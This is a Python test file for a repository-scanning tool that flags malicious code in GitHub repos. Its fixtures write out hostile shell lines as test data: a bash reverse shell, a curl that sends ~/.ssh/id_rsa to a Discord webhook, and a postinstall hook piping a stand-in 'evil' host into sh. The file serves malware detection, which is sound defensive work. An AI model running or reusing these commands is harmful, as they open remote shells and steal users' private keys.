"""Tests for Tier-2 analysis (fixture dir; injected clone, no network)."""

from __future__ import annotations

from pathlib import Path

from git_warden.scanning.tier2 import analyze_repo, repo_code_hash, scan_candidate


def _make_malicious_repo(root: Path):
    (root / "setup.sh").write_text(
        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
        "curl https://discordapp.com/api/webhooks/1/x -d @~/.ssh/id_rsa\n",
        encoding="utf-8",
    )


def test_analyze_flags_malicious_repo(tmp_path):
    _make_malicious_repo(tmp_path)
    result = analyze_repo(tmp_path, "evil/repo")
    assert result.bash_score >= 5
    assert result.confirmed
    assert any(f.category == "reverse_shell" for f in result.bash_findings)
    # External scanners not installed in CI -> gracefully skipped.
    assert result.scanners["semgrep"].startswith("skipped")


def test_analyze_clean_repo_not_confirmed(tmp_path):
    (tmp_path / "build.sh").write_text("#!/bin/bash\nmake all\n", encoding="utf-8")
    result = analyze_repo(tmp_path, "good/repo")
    assert not result.confirmed
    assert result.bash_score == 0


def test_code_hash_is_stable_and_content_sensitive(tmp_path):
    (tmp_path / "a.sh").write_text("echo hi\n", encoding="utf-8")
    h1 = repo_code_hash(tmp_path)
    assert h1 == repo_code_hash(tmp_path)  # stable
    (tmp_path / "a.sh").write_text("echo bye\n", encoding="utf-8")
    assert repo_code_hash(tmp_path) != h1  # content-sensitive


def test_scan_candidate_with_injected_clone(tmp_path):
    def fake_clone(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        _make_malicious_repo(dest)
        return dest

    result = scan_candidate("evil/repo", tmp_path, clone=fake_clone)
    assert result is not None
    assert result.confirmed


def test_scan_candidate_returns_none_on_clone_failure(tmp_path):
    result = scan_candidate("x/y", tmp_path, clone=lambda *a, **k: None)
    assert result is None


def test_clone_rejects_invalid_full_name(tmp_path):
    from git_warden.scanning.tier2 import clone_repo
    # eval #16: traversal / non-allowlisted names rejected before any fs/clone op.
    assert clone_repo("a/../../evil", tmp_path / "d1") is None
    assert clone_repo("not-a-repo", tmp_path / "d2") is None
    assert clone_repo("owner/re po", tmp_path / "d3") is None


def test_enumeration_only_does_not_confirm(tmp_path):
    # eval #15: weak recon alone must not reach confirmation/gold.
    (tmp_path / "recon.sh").write_text(
        "whoami\nuname -a\nid\nhostname\nnetstat -an\nifconfig\n", encoding="utf-8"
    )
    result = analyze_repo(tmp_path, "x/y")
    assert not result.confirmed


def test_semgrep_flag_alone_does_not_confirm(monkeypatch, tmp_path):
    # Semgrep --config auto flags ordinary code smells; on its own it must NOT
    # confirm a clean repo (would re-introduce the tiledesk FP in CI).
    import git_warden.scanning.tier2 as t2
    (tmp_path / "app.js").write_text("export const add = (a, b) => a + b;\n", encoding="utf-8")
    monkeypatch.setattr(t2.shutil, "which", lambda n: "/usr/bin/" + n)

    def runner(cmd, **k):
        class R:
            returncode = 0
            stdout = '{"results": [{"check_id": "smell"}], "errors": []}' if cmd[0] == "semgrep" \
                else "{}"
            stderr = ""
        return R()

    result = analyze_repo(tmp_path, "legit/app", runner=runner)
    assert result.scanners["semgrep"] == "flagged"
    assert not result.confirmed  # semgrep smell != malware


def test_guarddog_flag_confirms(monkeypatch, tmp_path):
    # A malware-specific scanner (GuardDog) flagging IS sufficient to confirm.
    import json as _json

    import git_warden.scanning.tier2 as t2
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
    monkeypatch.setattr(t2.shutil, "which", lambda n: "/usr/bin/" + n)

    def runner(cmd, **k):
        class R:
            returncode = 0
            stdout = _json.dumps({"issues": 1}) if cmd[0] == "guarddog" else "{}"
            stderr = ""
        return R()

    assert analyze_repo(tmp_path, "evil/pkg", runner=runner).confirmed


def test_run_external_semgrep_flags_only_on_results(monkeypatch, tmp_path):
    import json as _json

    import git_warden.scanning.tier2 as t2
    monkeypatch.setattr(t2.shutil, "which", lambda n: "/usr/bin/" + n)

    def _resp(returncode, payload):
        class R:
            pass
        r = R()
        r.returncode, r.stdout, r.stderr = returncode, _json.dumps(payload), ""
        return r

    def flag_runner(cmd, **k):
        return _resp(1, {"results": [{"check_id": "x"}], "errors": []})

    def err_runner(cmd, **k):
        return _resp(2, {"results": [], "errors": [{"message": "boom"}]})

    def clean_runner(cmd, **k):
        return _resp(0, {"results": [], "errors": []})

    assert t2._run_external("semgrep", tmp_path, flag_runner) == "flagged"
    assert t2._run_external("semgrep", tmp_path, err_runner) == "error"
    assert t2._run_external("semgrep", tmp_path, clean_runner) == "clean"


def test_clone_rejects_trailing_newline_in_full_name(tmp_path):
    from git_warden.scanning.tier2 import clone_repo
    assert clone_repo("owner/repo\n", tmp_path / "d") is None  # fullmatch, not $


def test_force_rmtree_removes_readonly_files(tmp_path):
    import os
    import stat

    from git_warden.scanning.tier2 import _force_rmtree
    sub = tmp_path / "tree" / "sub"
    sub.mkdir(parents=True)
    f = sub / "pack.idx"
    f.write_text("x", encoding="utf-8")
    os.chmod(f, stat.S_IREAD)  # simulate git read-only pack file
    _force_rmtree(tmp_path / "tree")
    assert not (tmp_path / "tree").exists()


def test_force_rmtree_noop_on_missing(tmp_path):
    from git_warden.scanning.tier2 import _force_rmtree
    _force_rmtree(tmp_path / "nope")  # must not raise


def test_scan_candidate_removes_dest_after_scan(tmp_path):
    captured = {}

    def clone_capture(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        (dest / "x.sh").write_text("echo hi\n", encoding="utf-8")
        captured["dest"] = dest
        return dest

    result = scan_candidate("o/r", tmp_path, clone=clone_capture)
    assert result is not None
    assert not captured["dest"].exists()  # force-removed on success, no accumulation


def test_lineage_confirm_categories_ignore_tool_own_code(tmp_path):
    from git_warden.scanning.tier2 import WEAPONIZATION_CATEGORIES
    # A red-team tool's OWN reverse shell must NOT confirm under lineage rules.
    (tmp_path / "agent.sh").write_text(
        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8"
    )
    res = analyze_repo(tmp_path, "evil/sliver-fork", confirm_categories=WEAPONIZATION_CATEGORIES)
    assert not res.confirmed  # reverse_shell is not a weaponization category


def test_lineage_confirm_on_added_install_hook(tmp_path):
    import json as _j

    from git_warden.scanning.tier2 import WEAPONIZATION_CATEGORIES
    # A weaponized fork that ADDED a malicious install hook DOES confirm.
    (tmp_path / "package.json").write_text(
        _j.dumps({"scripts": {"postinstall": "curl http://evil|sh"}}), encoding="utf-8"
    )
    res = analyze_repo(tmp_path, "evil/sliver-weaponized",
                       confirm_categories=WEAPONIZATION_CATEGORIES)
    assert res.confirmed


def test_restrict_paths_limits_findings(tmp_path):
    (tmp_path / "tool.sh").write_text("curl -d @x http://evil\n", encoding="utf-8")
    (tmp_path / "added.sh").write_text("curl -d @y http://evil\n", encoding="utf-8")
    res = analyze_repo(tmp_path, "o/r", restrict_paths={"added.sh"})
    assert {f.file for f in res.bash_findings} == {"added.sh"}
